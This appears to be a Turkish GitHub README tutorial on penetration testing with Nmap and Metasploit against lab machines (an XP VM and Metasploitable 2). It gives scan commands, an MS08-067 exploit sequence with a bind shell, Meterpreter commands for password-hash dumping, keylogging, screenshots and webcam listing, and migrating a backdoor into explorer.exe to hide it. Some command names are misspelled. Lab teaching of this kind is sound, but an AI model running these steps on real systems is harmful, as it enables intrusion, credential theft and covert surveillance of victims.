# Sizma Testlerinde Metasploit Kullanimi

<h2>Nmap ve Metasploit Kullanarak Örnek Test</h2>

sudo apt-get update

sudo apt-get  install nmap (nmap aracını yüklemek için terminale yazıyoruz)

nmap  -sS  -A -p  192.168.159.128 (Ip adresine-XP makinamızın IP adresi- versiyon, işletim sistemi ve port taraması yapılır.) Açık portlardan saldırı düzenlenebilir.  Açık portlara ayrıca tarama yapılır.


![meta](https://github.com/Tugce41/Sizma_Testlerinde_Metasploit_Kullanimi/assets/106156890/91754314-1a3d-4b73-a344-2345344e2fac)



msfconsole (Terminale yazarak metasploit başlatılır).


 search ms08 (exploiti aratıyoruz. Ardından karşımıza exploitler çıkıyor.)

 
use exploit/Windows/sbm/ms08_067_ntapi (use yazarak istediğimiz exploiti kullanmayı  sağlıyoruz)


 show payloads ( diyerek payload’ları görüntülenmesini sağlıyoruz)

 
set payloads windows/shell/bind_tcp(seçtiğimiz payload’ı yazıyoruz)


 show options (yazarak seçenekleri görüntülüyoruz).

 
set RHOST_._._._(hedef IP) (hedefin adresini yazıyoruz).


 exploit ( son olarak yazıp exploiti yolluyoruz ).

 
 Artık hedef bilgisayar elimizde istediğimiz gibi işlem yapabiliriz.

 
 shutdown àkomutunu yazdığımız da hedef bilgisayarın kendiliğinden kapandığını görebiliriz.


 ![meta2](https://github.com/Tugce41/Sizma_Testlerinde_Metasploit_Kullanimi/assets/106156890/70cda952-a291-4c30-8d04-9145950a990d)




<h2> PORT ve İŞLETİM SİSTEMİ Tespit Taramaları</h2>

Nmap Syn taraması örneğini aşağıya yazıyorum. Kali terminal ekranına


```
nmap -sS 192.168.136.0/24
```


Buradaki -sS paremetresi ile Syn Scan olacağını 192 ile başlayan ip ise hedefin bulunduğu ağın ip bloğu. Burada 0/24 demek 192.168.136.0 dan başla 192.168.136.255’e kadar tara demektir.


TCP taraması için


```
nmap -sT 192.168.136.0/24
```

UDP taraması için

```
nmap -sU 192.168.136.0/24
```

 

ŞİMDİ SIRA PORT TARAMASINDA...

![meta3](https://github.com/Tugce41/Sizma_Testlerinde_Metasploit_Kullanimi/assets/106156890/12926c18-5901-4644-bf85-ff5709903db8)


görselde zafiyetli bir makine bulunmaktadır ve ip numarası “192.168.136.129” . 

Bu zafiyetli makine Rapid7 firmasının geliştirmiş olduğu siber güvenlik uzmanlığı yolunda ilerlemek isteyen insanların herhangi bir bilişim suçu işlemeden üzerinde rahatça sızma testi yapmasını sağlayan METASPLOİTABLE 2 makinesidir.



```
nmap -sS -p 0-65535 192.168.136.129
```

İle tarama gerçekleştirirsem bütün portları tarayacaktır.


```
nmap -sS -F 192.168.136.129
```


İle tarama gerçekleştirirsem en çok kullanılan 100 portu tarayacaktır.



```
nmap -sS -p80 192.168.136.129
```

İle tarama gerçekleştirirsem sadece 80 nolu portu tarayacaktır.




```
nmap -sS -O 192.168.136.129
```


hedef işletim sisteminin test edilmesi -O parametresi ile yapılır




sıra açık portların üzerinde çalışan servislerin versiyonlarını tespit etmeye geldi.

ek olarak  -sV veya -vv parametrelerini ekliyoruz. 


```
nmap -sS -O -sV 192.168.136.129
```


![meta4](https://github.com/Tugce41/Sizma_Testlerinde_Metasploit_Kullanimi/assets/106156890/58a4ab47-e76e-42b9-8225-6970d1db584b)


kodu görmek amacıyla kırptım.


<h2>ancak unutmamalıkı bu servislerin hepsi doğru diyemeyiz nmap taradıgı verilşerde tahmin yapar, fakat bu tahminin yanlış olduğu anlamına gelmez. Sızma testinde her şey denenmelidir</h2>


<h3>bu örnekte

hedef makinemizi tespit ettik,
makinemizin portlarını taradık,
portların üzerinde çalışan servisleri tespit ettik 

</h3>




<h2>Msfvenom ile Meterpreter(Backdoor) payloadı oluşturma ve oturum elde etme</h2>


help komutunu kullandım

![met1](https://github.com/Tugce41/Sizma_Testlerinde_Metasploit_Kullanimi/assets/106156890/be3176f8-7724-41d0-b992-58bcb26c2425)


background komutu meterpreter oturumunda iken (sessions) geri msfconsole ekranına dönmemizi sağlar.


![met2](https://github.com/Tugce41/Sizma_Testlerinde_Metasploit_Kullanimi/assets/106156890/9b67af97-a98f-41ef-9b2d-5c3bf0902b03)



pwd komutu şuan da bulunduğunuz dizini ekrana yazdırır.  //pwd komutunu yazdım


![met3](https://github.com/Tugce41/Sizma_Testlerinde_Metasploit_Kullanimi/assets/106156890/69bf7a8d-1a96-4c2b-ab19-d4a5ad7bc916)



getuid komutu ile hedef sistemde hangi kullanıcı ile aktif olduğunuzu görebilirsiniz.  ////getuid komutu yazdım



hasdump komutu ile hedef sistemdeki tüm parolaları görebilirsiniz fakat şifreli halde.


ps hedef bilgisayarda çalışan tüm işlemleri görüntülememizi sağlar.


![met6](https://github.com/Tugce41/Sizma_Testlerinde_Metasploit_Kullanimi/assets/106156890/665f81f8-2170-4ede-9133-980f3a318e8c)


sysinfo komutu hedefin sistemi hakkında bilgi almamızı sağlar. ////sysinfo komutu yazdım


shell komutu hedef sistemin CMD ekranına düşmemizi sağlar. ////shell komutuyazdım


webcam_list komutu ile hedefte kullanılabilir durumda olan webcamleri listeleriz.


screenshot komutu ile hedefin ekran görüntüsü alınabilir.


keyscan_start komutu ile hedefin basmış olduğu klavye tuşlarını kayıt altına alabilirsiniz.


keyscan_dump komutu ile hedefin tuş dökümlerini almamızı sağlar.


keyscan_stop komutu ilede keyscan işlemi sonlandırılır.


<h3>Şimdi sıra backdoor da</h3>


![met9](https://github.com/Tugce41/Sizma_Testlerinde_Metasploit_Kullanimi/assets/106156890/80f64ea6-49eb-4d62-9570-09fa42e227f5)

zararli.exe olarak gözükmektedir.

işlem “explorer.exe” işlemi 

vbu işlemin PID numarasını alıyoruz. 

Migrate komutu ile PID numarasına sıçrama işlemi yapıyoruz.


![m2](https://github.com/Tugce41/Sizma_Testlerinde_Metasploit_Kullanimi/assets/106156890/33041f50-9edf-4a4c-b2aa-4a101be597aa)


Şimdi PS komutu ile tekrar çalışan işlemlere bakalım.


ve zararli.exe dosyayı kalkmış bulunuyor







